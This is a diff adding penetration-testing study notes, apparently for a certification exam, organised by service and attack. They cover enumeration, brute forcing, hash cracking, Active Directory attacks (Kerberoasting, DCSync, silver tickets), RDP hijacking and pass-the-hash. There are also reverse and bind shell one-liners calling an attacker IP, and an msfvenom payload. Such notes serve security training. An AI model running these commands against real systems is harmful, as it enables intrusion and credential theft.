+ssh -v cry0l1t3@10.129.14.132 -o PreferredAuthentications=password
+```
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-25-587-smtp-a77466e5"></a>
+
+<a id="cpts-enumeration-service-enumeration-25-587-smtp-a77466e5--25587-smtp"></a>
+
+# 25,587 smtp
+
+
+<a id="cpts-enumeration-service-enumeration-25-587-smtp-a77466e5--basic-scanning"></a>
+
+#### Basic Scanning
+```shell
+sudo nmap 10.129.14.128 -sC -sV -p25,587
+sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
+```
+
+<a id="cpts-enumeration-service-enumeration-25-587-smtp-a77466e5--connecting-to-the-target"></a>
+
+#### Connecting to the target
+```bash
+telnet 10.129.14.128 25
+```
+
+<a id="cpts-enumeration-service-enumeration-25-587-smtp-a77466e5--basic-telnet-commands"></a>
+
+#### Basic telnet commands
+![Pasted image 20250401220050.png](cpts/assets/Pasted%20image%2020250401220050.png)
+![Pasted image 20250401220100.png](cpts/assets/Pasted%20image%2020250401220100.png)
+
+<a id="cpts-enumeration-service-enumeration-25-587-smtp-a77466e5--smtp-user-enum"></a>
+
+#### SMTP User Enum
+![Pasted image 20250401225300.png](cpts/assets/Pasted%20image%2020250401225300.png)
+
+<a id="cpts-enumeration-service-enumeration-25-587-smtp-a77466e5--default-config-file"></a>
+
+#### Default Config File
+```shell
+cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
+```
+
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-3306-mysql-3d7e83f5"></a>
+
+<a id="cpts-enumeration-service-enumeration-3306-mysql-3d7e83f5--3306-mysql"></a>
+
+# 3306 mysql
+
+
+Basic Commands
+```shell
+sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
+```
+
+Login Command
+```shell
+mysql -u root -h 10.129.14.132
+mysql -u root -pP4SSw0rd -h 10.129.14.128
+
+# if ssl fails
+mysql -u robin -probin -h 10.129.42.195 --ssl=0
+
+mysql -u root -p'root' -h 192.168.238.16 -P 3306 --ssl-verify-server-cert=FALSE
+```
+
+mysql important console commands
+```shell-session
+mysql> use sys;
+mysql> show tables;  
+```
+![Pasted image 20250403004448.png](cpts/assets/Pasted%20image%2020250403004448.png)
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-3389-rdp-2169bdb7"></a>
+
+<a id="cpts-enumeration-service-enumeration-3389-rdp-2169bdb7--3389-rdp"></a>
+
+# 3389 rdp
+
+Basic Commands
+```shell
+nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
+nmap -sV -sC 10.129.201.248 -p3389 --packet-trace --disable-arp-ping -n
+sudo cpan
+```
+
+RDP Security check
+```bash
+#In cpts-tools/rdp-sec-check
+./rdp-sec-check.pl 10.129.201.248
+```
+
+RDP Initiation command
+```shell
+xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
+```
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-512-514-r-services-39d8144a"></a>
+
+<a id="cpts-enumeration-service-enumeration-512-514-r-services-39d8144a--512-514-r-services"></a>
+
+# 512-514 r-services
+
+
+- If the service is configured poorly, we might get free authentication
+- If we are included in /etc/hosts.equiv or .rhosts files on the system
+
+![Pasted image 20250403224738.png](cpts/assets/Pasted%20image%2020250403224738.png)
+
+Basic Commands
+```shell
+sudo nmap -sV -p 512,513,514 10.0.17.2
+```
+
+Logging in using Rlogin
+```shell
+rlogin 10.0.17.2 -l htb-student
+```
+
+
+Finding Authenticated users using R-Commands
+![Pasted image 20250403224858.png](cpts/assets/Pasted%20image%2020250403224858.png)
+
+![Pasted image 20250403225049.png](cpts/assets/Pasted%20image%2020250403225049.png)
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-53-dns-982aa88f"></a>
+
+<a id="cpts-enumeration-service-enumeration-53-dns-982aa88f--53-dns"></a>
+
+# 53 dns
+
+
+<a id="cpts-enumeration-service-enumeration-53-dns-982aa88f--dig-command"></a>
+
+#### Dig Command
+- the most basic dns query command
+![Pasted image 20250401192631.png](cpts/assets/Pasted%20image%2020250401192631.png)
+```bash
+dig soa www.inlanefreight.com
+dig ns inlanefreight.htb @10.129.14.128
+```
+
+<a id="cpts-enumeration-service-enumeration-53-dns-982aa88f--dns-server-version-query"></a>
+
+#### DNS server version query
+```shell
+dig CH TXT version.bind 10.129.120.85
+```
+
+<a id="cpts-enumeration-service-enumeration-53-dns-982aa88f--list-all-available-dns-records-almost-all"></a>
+
+#### List all available DNS Records (almost all)
+```shell
+dig any inlanefreight.htb @10.129.14.128
+```
+<a id="cpts-enumeration-service-enumeration-53-dns-982aa88f--dig-axfr-zone-transfer"></a>
+
+#### Dig AXFR Zone Transfer
+```shell
+dig axfr inlanefreight.htb @10.129.14.128
+dig axfr internal.inlanefreight.htb @10.129.14.128
+```
+
+<a id="cpts-enumeration-service-enumeration-53-dns-982aa88f--subdomain-bruteforcing"></a>
+
+#### Subdomain Bruteforcing
+```shell
+for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
+
+dnsenum --dnsserver 10.129.42.195 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt inlanefreight.htb
+
+```
+
+DNS Abbreviations
+
+| Abbv | Meaning                         |
+| ---- | ------------------------------- |
+| FQDN | Fully Qualified Domain Name     |
+| AXFR | Asynchronous Full Transfer Zone |
+
+
+
+Default Config Files (bind9)
+- `named.conf.local`
+- `named.conf.options`
+- `named.conf.log`
+-  all can be found in the /etc/bind directory 
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-5985-5986-winrm-4ff73d47"></a>
+
+<a id="cpts-enumeration-service-enumeration-5985-5986-winrm-4ff73d47--59855986-winrm"></a>
+
+# 5985,5986 WinRM
+
+Basic Commands
+```shell
+nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
+```
+
+Evil-winrm
+```shell
+evil-winrm -i 10.129.201.248 -u Cry0l1t3 -p P455w0rD!
+```
+
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-623-ipmi-fd1b107c"></a>
+
+<a id="cpts-enumeration-service-enumeration-623-ipmi-fd1b107c--623-ipmi"></a>
+
+# 623 IPMI
+
+
+Basic commands
+```shell
+sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
+
+msfconsole
+use auxiliary/scanner/ipmi/ipmi_version
+set rhosts 10.129.42.195
+run
+
+```
+
+Getting hashes using msfconsole
+```shell
+msfconsole
+use auxiliary/scanner/ipmi/ipmi_dumphashes 
+set rhosts 10.129.42.195
+show options 
+run
+
+hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
+hashcat -m 7300 ipmi.txt /usr/share/wordlists/rockyou.txt 
+```
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8"></a>
+
+<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--80443-http"></a>
+
+# 80,443 http
+
+
+- Check URL address for clues such as .html .php
+- Ctrl-U and check source for further clues like comments or file extensions
+- Inspect element as well just to be sure
+
+- Inspect the network tab for when requests are being sent (request headers and body)
+- lookout for sitemap.xml and robots.txt
+
+<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--nmap"></a>
+
+#### Nmap
+
+```shell
+sudo nmap -p80 -sC -sV 192.168.50.20
+sudo nmap -p80 --script=http-enum 192.168.50.20
+```
+
+<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--directoryfile-enumeration"></a>
+
+#### Directory/File Enumeration
+```bash
+gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
+
+ffuf -u http://siteisup.htb -H "Host: siteisup.htb/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 1131
+```
+
+<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--subdomain-enumeration"></a>
+
+#### SubDomain Enumeration
+```bash
+gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
+
+ffuf -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 1131
+```
+
+<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--banner-grabbingweb-server-headers"></a>
+
+#### Banner Grabbing/Web Server Headers
+```bash
+curl -IL https://www.inlanefreight.com
+whatweb 10.10.10.121
+whatweb --no-errors 10.10.10.0/24
+```
+
+<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--firefox-browse-to-ip"></a>
+
+#### Firefox (Browse to IP)
+Don't forget to do this and hit CTRL-U
+
+<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--curl"></a>
+
+#### CURL
+```bash
+curl http://10.129.42.190
+```
+
+
+<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--nikto"></a>
+
+#### Nikto
+```shell
+nikto -h <ip>
+```
+
+<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--cewl"></a>
+
+#### CEWL
+<https://github.com/digininja/CeWL>
+
+
+Additional Steps 
+- View SSL/TLS Certificate
+- Robots.txt
+- View Source Code
+- Add discovered domain into /etc/hosts
+
+<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--burp"></a>
+
+#### Burp
+
+- to bypass client side validation
+- Use repeater to keep repeating the sent request by manually changing
+- Use intruder to automate the attack
+- rmb to toggle foxyproxy
+
+<a id="cpts-enumeration-service-enumeration-80-443-http-3d6bc3e8--api-enumeration"></a>
+
+#### API Enumeration
+
+- Often has ```/api_name/v1``` naming convention
+
+Create the pattern first
+```shell
+{GOBUSTER}/v1
+{GOBUSTER}/v2
+```
+
+Launch gobuster
+```shell
+gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
+```
+
+We can then proceed to curl the found api endpoints to enumerate it further
+```shell
+curl -i http://192.168.50.16:5002/users/v1
+
+#adding payload and changing to PUT
+curl -X 'PUT' \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
+  -d '{"password": "pwned"}'
+```
+
+
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-873-rsync-1ea34b15"></a>
+
+<a id="cpts-enumeration-service-enumeration-873-rsync-1ea34b15--873-rsync"></a>
+
+# 873 rsync
+
+Basic Commands
+```shell
+sudo nmap -sV -p 873 127.0.0.1
+nc -nv 127.0.0.1 873
+rsync -av --list-only rsync://127.0.0.1/dev
+```
+
+Sync files 
+```bash
+rsync -av rsync://127.0.0.1/dev
+
+#if rsync is configured to use ssh to transfer files
+rsync -av rsync://127.0.0.1/dev -e "ssh -p2222"
+```
+
+
+---
+
+<a id="cpts-enumeration-service-enumeration-public-exploits-06f789b1"></a>
+
+<a id="cpts-enumeration-service-enumeration-public-exploits-06f789b1--public-exploits"></a>
+
+# Public Exploits
+
+
+Searchsploit
+```bash
+#Search names of services, port numbers, webpage title etc. to find vulnerabilites 
+#Search for exploits 
+searchsploit <application> 
+# Example search for wordpress 5.8 vulnerabilities 
+searchsploit wordpress 5.8 
+# Download exploit 
+searchsploit -m <exploit number>
+```
+
+Metasploit
+```bash
+msfconsole
+search <wtv i want to search>
+use exploit/windows/smb/ms17_010_psexec
+set
+check
+exploit
+```
+
+
+---
+
+<a id="cpts-exploits-bind-shell-47d00c53"></a>
+
+<a id="cpts-exploits-bind-shell-47d00c53--bind-shell"></a>
+
+# Bind Shell
+
+
+On Target Machine:
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
+
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l  7777 > /tmp/f
+```
+
+On Kali:
+```shell
+nc -nv 10.129.41.200 7777
+```
+
+
+---
+
+<a id="cpts-exploits-password-cracking-c9c27216"></a>
+
+<a id="cpts-exploits-password-cracking-c9c27216--password-cracking"></a>
+
+# Password Cracking
+
+<https://hashes.com/en/decrypt/hash>
+
+<a id="cpts-exploits-password-cracking-c9c27216--hashcat"></a>
+
+## HashCat
+
+<a id="cpts-exploits-password-cracking-c9c27216--methodology-for-password-cracking"></a>
+
+#### Methodology for password cracking
+```
+Use hashcat with auto detection
+Use hashcat and specify what hash with -m 
+Use hashcat and specify base64 rule
+Use hashcat mask attack
+Move to john the ripper/other attack vectors
+```
+
+<a id="cpts-exploits-password-cracking-c9c27216--mask-attack-command"></a>
+
+##### Mask attack command
+```shell
+hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
+```
+	?l	       abcdefghijklmnopqrstuvwxyz
+	?u	       ABCDEFGHIJKLMNOPQRSTUVWXYZ
+	?d	       0123456789
+	?h	       0123456789abcdef
+	?H	       0123456789ABCDEF
+	?s	       «space»!"#$%&'()*+,-./:;<=>?@[]^_`{
+	?a	       ?l?u?d?s
+	?b	       0x00 - 0xff
+
+---
+<a id="cpts-exploits-password-cracking-c9c27216--john-the-ripper"></a>
+
+## John the Ripper
+
+Usage:
+```shell
+john --format=<hash_type> --wordlist=<wordlist_file> <hash or hash_file>
+```
+
+<a id="cpts-exploits-password-cracking-c9c27216--wordlist-mode-vs-incremental-mode"></a>
+
+### Wordlist mode vs Incremental mode
+
+<a id="cpts-exploits-password-cracking-c9c27216--incremental"></a>
+
+##### Incremental
+Basically brute force using a specified character set, just put --incremental and you're good to go
+
+<a id="cpts-exploits-password-cracking-c9c27216--wordlist"></a>
+
+##### Wordlist
+Dictionary attack using specified wordlist
+
+<a id="cpts-exploits-password-cracking-c9c27216--cracking-files"></a>
+
+### Cracking Files
+- Cracking files which are password protected
+
+![Pasted image 20250419165210.png](cpts/assets/Pasted%20image%2020250419165210.png)
+
+<a id="cpts-exploits-password-cracking-c9c27216--list-of-tools-to-convert-into-john-crackable-format"></a>
+
+##### List of tools to convert into john crackable format
+
+- pdf2john
+- ssh2john
+- mscash2john
+- keychain2john
+- rar2john
+- pfx2john
+- truecrypt_volume2john
+- keepass2john
+- vncpcap2john
+- putty2john
+- zip2john
+- hccap2john
+- office2john
+- wpa2john 
+(rmb to remove the format: header in the new file before cracking)
+
+
+<a id="cpts-exploits-password-cracking-c9c27216--john-the-ripper_1"></a>
+
+## John the Ripper
+
+```bash
+john --wordlist=ssh.passwords --rules=sshRules ssh.hash
+```
+
+To add rules, we must first have it the same format as hashcat's rules. Afterwards just append it to the end of the john.conf file
+```bash
+sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
+```
+![Pasted image 20250530110928.png](cpts/assets/Pasted%20image%2020250530110928.png)
+
+
+
+---
+
+<a id="cpts-exploits-password-spraying-brute-forcing-002cc339"></a>
+
+<a id="cpts-exploits-password-spraying-brute-forcing-002cc339--password-spraying-brute-forcing"></a>
+
+# Password Spraying (Brute forcing)
+
+
+<a id="cpts-exploits-password-spraying-brute-forcing-002cc339--netexeccrackmapexec"></a>
+
+### Netexec/Crackmapexec
+```shell
+netexec winrm 10.129.42.197 -u user.list -p password.list --continue-on-success
+netexec smb 10.129.42.197 -u "user" -p "password" --shares
+```
+Good flags to use
+--users
+--groups
+--loggedon-users
+--shares
+-M spider_plus --share 'SHARE NAME'
+<a id="cpts-exploits-password-spraying-brute-forcing-002cc339--hydra"></a>
+
+### Hydra
+```shell
+hydra -L user.list -P password.list ssh://10.129.42.197
+hydra -L user.list -P password.list rdp://10.129.42.197
+hydra -L user.list -P password.list smb://10.129.42.197
+```
+- for smb if the version is SMBv3 we might get an error if that happens use msfconsole
+
+<a id="cpts-exploits-password-spraying-brute-forcing-002cc339--msfconsole"></a>
+
+##### MSFConsole
+```shell
+vernonlim03@htb[/htb]$ msfconsole -q
+
+msf6 > use auxiliary/scanner/smb/smb_login
+msf6 auxiliary(scanner/smb/smb_login) > options 
+```
+
+
+<a id="cpts-exploits-password-spraying-brute-forcing-002cc339--on-windows"></a>
+
+## On Windows
+
+<a id="cpts-exploits-password-spraying-brute-forcing-002cc339--using-domainpasswordsprayps1"></a>
+
+#### Using DomainPasswordSpray.ps1
+```powershell
+Import-Module .\DomainPasswordSpray.ps1
+Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
+```
+
+
+---
+
+<a id="cpts-exploits-reverse-shell-a7dfcd09"></a>
+
+<a id="cpts-exploits-reverse-shell-a7dfcd09--reverse-shell"></a>
+
+# Reverse Shell
+
+Set up Netcat Listener
+```bash
+rlwrap nc -lvnp 1234
+```
+
+Bash Reverse Shell Command
+```bash
+bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
+```
+Bash Reverse Shell Command 2
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
+```
+
+<a id="cpts-exploits-reverse-shell-a7dfcd09--revshells-generator"></a>
+
+#### Revshells Generator
+<https://revshells.com>
+
+<a id="cpts-exploits-reverse-shell-a7dfcd09--msfvenom"></a>
+
+#### MSFVenom
+```shell
+msfvenom -l payloads
+
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+```
+
+
+---
+
+<a id="cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b"></a>
+
+<a id="cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b--as-rep-roasting"></a>
+
+# AS-REP Roasting
+
+
+<a id="cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b--use-impacket-if-you-have-creds-from-kali"></a>
+
+# USE IMPACKET IF YOU HAVE CREDS FROM KALI
+<a id="cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b--use-rubeus-if-you-dont-have-creds-but-have-access-to-the-box"></a>
+
+# USE RUBEUS IF YOU DON'T HAVE CREDS BUT HAVE ACCESS TO THE BOX
+
+
+<a id="cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b--impacket"></a>
+
+### Impacket
+
+```bash
+impacket-GetNPUsers -dc-ip 192.168.50.70  -request corp.com/pete
+```
+
+Use mode 18200 on hashcat to crack
+```bash
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+
+
+<a id="cpts-exploits-ad-exploits-as-rep-roasting-fe53b24b--rubeus"></a>
+
+### Rubeus
+
+```powershell
+.\Rubeus.exe asreproast /nowrap
+```
+
+Use mode 18200 on hashcat to crack
+```bash
+sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+
+---
+
+<a id="cpts-exploits-ad-exploits-dcsync-attack-6c94bd8d"></a>
+
+<a id="cpts-exploits-ad-exploits-dcsync-attack-6c94bd8d--dcsync-attack"></a>
+
+# DCSync Attack
+
+
+
+<a id="cpts-exploits-ad-exploits-dcsync-attack-6c94bd8d--impacket"></a>
+
+### Impacket
+
+```bash
+sudo impacket-secretsdump corp.com/jeffadmin:'BrouhahaTungPerorateBroom2023!'@192.168.137.75
+```
+
+```bash
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+
+
+<a id="cpts-exploits-ad-exploits-dcsync-attack-6c94bd8d--mimikatz"></a>
+
+### Mimikatz
+
+```mimikatz
+lsadump::dcsync /user:corp\dave
+```
+
+```bash
+hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+![Pasted image 20250913220745.png](cpts/assets/Pasted%20image%2020250913220745.png)
+
+
+---
+
+<a id="cpts-exploits-ad-exploits-kerberoasting-8eb4e711"></a>
+
+<a id="cpts-exploits-ad-exploits-kerberoasting-8eb4e711--kerberoasting"></a>
+
+# Kerberoasting
+
+
+<a id="cpts-exploits-ad-exploits-kerberoasting-8eb4e711--use-impacket-if-you-have-creds-from-kali"></a>
+
+# USE IMPACKET IF YOU HAVE CREDS FROM KALI
+<a id="cpts-exploits-ad-exploits-kerberoasting-8eb4e711--use-rubeus-if-you-dont-have-creds-but-have-access-to-the-box"></a>
+
+# USE RUBEUS IF YOU DON'T HAVE CREDS BUT HAVE ACCESS TO THE BOX
+<a id="cpts-exploits-ad-exploits-kerberoasting-8eb4e711--impacket"></a>
+
+### Impacket
+
+```bash
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete:Password
+```
+
+```bash
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+
+
+
+<a id="cpts-exploits-ad-exploits-kerberoasting-8eb4e711--rubeus"></a>
+
+### Rubeus 
+
+```powershell
+.\Rubeus.exe kerberoast /nowrap #PASTE IN CYBERCHEF TO REMOVE WHITESPACE
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap 
+.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap /tgtdeleg #req for rc4
+```
+
+```bash
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+
+---
+
+<a id="cpts-exploits-ad-exploits-llmnr-nbtns-poisoning-d7c6a994"></a>
+
+<a id="cpts-exploits-ad-exploits-llmnr-nbtns-poisoning-d7c6a994--llmnr-nbtns-poisoning"></a>
+
+# LLMNR-NBTNS Poisoning
+
+
+<a id="cpts-exploits-ad-exploits-llmnr-nbtns-poisoning-d7c6a994--responder"></a>
+
+### Responder
+
+Common responder start commands
+```shell
+sudo responder -I ens244
+sudo responder -I ens244 -wrf
+```
+
+NTLMV2 Cracking (module 5600)
+```shell
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+
+<a id="cpts-exploits-ad-exploits-llmnr-nbtns-poisoning-d7c6a994--inveigh-windows"></a>
+
+### Inveigh (Windows)
+Use the .exe one as opposed to the powershell one as it is maintained by the creator
+```powershell
+.\Inveigh.exe
+(Hit esc after running to access the console)
+HELP #view all commands 
+GET NTLMV2UNIQUE
+```
+
+
+---
+
+<a id="cpts-exploits-ad-exploits-silver-ticket-attack-996b78a5"></a>
+
+<a id="cpts-exploits-ad-exploits-silver-ticket-attack-996b78a5--silver-ticket-attack"></a>
+
+# Silver Ticket Attack
+
+
+Use mimikatz to dump out the hash of the service account
+![Pasted image 20250605180018.png](cpts/assets/Pasted%20image%2020250605180018.png)
+
+Get the sid of the current logged in user
+```powershell
+whoami /user
+```
+
+Use mimikatz to create the silver ticket
+```mimikatz
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+```
+
+Confirm the above works by using klist in powershell
+```powershell
+klist
+```
+
+<a id="cpts-exploits-ad-exploits-silver-ticket-attack-996b78a5--try-to-chain-it-so-that-itll-work-more-smoothly"></a>
+
+## Try to chain it so that it'll work more smoothly
+```powershell
+.\mimikatz.exe "kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin" "exit"
+```
+
+
+---
+
+<a id="cpts-exploits-service-exploits-dns-1358e590"></a>
+
+<a id="cpts-exploits-service-exploits-dns-1358e590--dns"></a>
+
+# DNS
+
+
+<a id="cpts-exploits-service-exploits-dns-1358e590--dig-axfr-zone-transfer"></a>
+
+## DIG - AXFR Zone Transfer
+```shell
+dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
+```
+
+<a id="cpts-exploits-service-exploits-dns-1358e590--fierce-enumeration"></a>
+
+### Fierce Enumeration
+enumerate all DNS servers of the root domain and scan for a DNS zone transfer
+```shell
+fierce --domain zonetransfer.me
+```
+
+<a id="cpts-exploits-service-exploits-dns-1358e590--subdomain-enumeration"></a>
+
+### Subdomain Enumeration
+```shell
+subfinder -d inlanefreight.com -v
+
+./subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt
+```
+
+
+IF somehow need dns spoofing, refer to htb academy
+
+
+---
+
+<a id="cpts-exploits-service-exploits-ftp-73147af4"></a>
+
+<a id="cpts-exploits-service-exploits-ftp-73147af4--ftp"></a>
+
+# FTP
+
+
+Connect to ftp
+```shell-session
+ftp 192.168.2.142
+```
+
+<a id="cpts-exploits-service-exploits-ftp-73147af4--always-try-anonymous-access-and-adminadmin"></a>
+
+## Always try Anonymous access and admin:admin
+
+
+<a id="cpts-exploits-service-exploits-ftp-73147af4--brute-force-login"></a>
+
+### Brute force login
+We can use medusa or hydra but just use hydra. If all else fails use netexec
+```shell-session
+medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 
+hydra -l john -P /usr/share/wordlists/rockyou.txt ftp://10.29.148.23
+```
+
+
+<a id="cpts-exploits-service-exploits-ftp-73147af4--ftp-bounce-attack"></a>
+
+#### FTP Bounce Attack
+An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a `PORT` command to trick the FTP connection into running commands and getting information from a device other than the intended server.
+
+The Nmap -b flag can be used to perform an FTP bounce attack:
+```shell
+nmap -Pn -v -n -p80 -b anonymous:password@10.10.110.213 172.17.0.2
+```
+
+
+---
+
+<a id="cpts-exploits-service-exploits-rdp-76d94045"></a>
+
+<a id="cpts-exploits-service-exploits-rdp-76d94045--rdp"></a>
+
+# RDP
+
+
+<a id="cpts-exploits-service-exploits-rdp-76d94045--connecting-to-rdp-service"></a>
+
+### Connecting to RDP service
+```shell
+xfreerdp3 /u:svc.callback /v:10.200.150.10 /p:Password1
+xfreerdp3 /u:svc.callback /v:10.200.150.10 /pth:66338f1647cc6a33fd686cd20e7bb917
+```
+
+<a id="cpts-exploits-service-exploits-rdp-76d94045--brute-forcing-rdp-access"></a>
+
+### Brute Forcing RDP Access
+```shell
+hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+```
+
+
+---
+<a id="cpts-exploits-service-exploits-rdp-76d94045--rdp-session-hijacking"></a>
+
+### RDP Session Hijacking
+```cmd
+C:\htb> query user
+
+#If we have SYSTEM privileges
+C:\htb> tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME> 
+
+#If we don't have SYSTEM privileges but we are Administrator
+C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+C:\htb> net start sessionhijack
+```
+
+
+---
+
+<a id="cpts-exploits-service-exploits-rdp-76d94045--rdp-pass-the-hash-pth"></a>
+
+### RDP Pass-the-Hash (PtH)
+```cmd
+xfreerdp3 /u:svc.callback /v:10.200.150.10 /pth:66338f1647cc6a33fd686cd20e7bb917
+```
+
+<a id="cpts-exploits-service-exploits-rdp-76d94045--adding-the-disablerestrictedadmin-registry-key"></a>
+
+#### Adding the DisableRestrictedAdmin Registry Key
+```cmd
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+```
+
+
+---
+
+<a id="cpts-exploits-service-exploits-smb-0ab037f4"></a>
+
+<a id="cpts-exploits-service-exploits-smb-0ab037f4--smb"></a>
+
+# SMB
+
+
+List shares on smb
+```shell-session
+smbclient -N -L //10.129.14.128
+```
+
+Use smbmap for simpler automation
+```shell
+smbmap -H 10.129.14.128
+smbmap -H 10.129.14.128 -r notes
+
+# use this to download files
+smbmap -H 10.129.14.128 --download "notes\note.txt"
+
+# use this to upload files
+smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
+```
+
+<a id="cpts-exploits-service-exploits-smb-0ab037f4--use-enum4linux-to-do-some-quick-enumeration"></a>
+
+#### Use enum4linux to do some quick enumeration
+```shell
+enum4linux 10.10.11.45 -A -C
+```
+
+
+<a id="cpts-exploits-service-exploits-smb-0ab037f4--brute-forcing-smb"></a>
+
+### Brute Forcing SMB 
+```shell
+netexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
+```
+
+<a id="cpts-exploits-service-exploits-smb-0ab037f4--useful-netexec-tags"></a>
+
+##### Useful netexec tags
+```shell
+--loggedon-users
+--sam
+```
+
+
+<a id="cpts-exploits-service-exploits-smb-0ab037f4--rce-through-impacket-psexec"></a>
+
+#### RCE through Impacket-Psexec
+```shell
+impacket-psexec administrator:'Password123!'@10.10.110.17
+```
+
+<a id="cpts-exploits-service-exploits-smb-0ab037f4--llmnr-poisoning"></a>
+
+#### LLMNR Poisoning
+```shell
+sudo responder -I ens33
+```
+
+We can use ntlmrelayx on top of this if required refer to htb academy is really needed
+
+
+---
+
+<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e"></a>
+
+<a id="cpts-exploits-service-exploits-smtp-imap-pop3-ff983f4e--smtp-imap-pop3"></a>
+
+# SMTP-IMAP-POP3
+
+
+Basic Enumeration
+```shell
+host -t MX hackthebox.eu
+host -t MX microsoft.com
+
+dig mx plaintext.do | grep "MX" | grep -v ";"
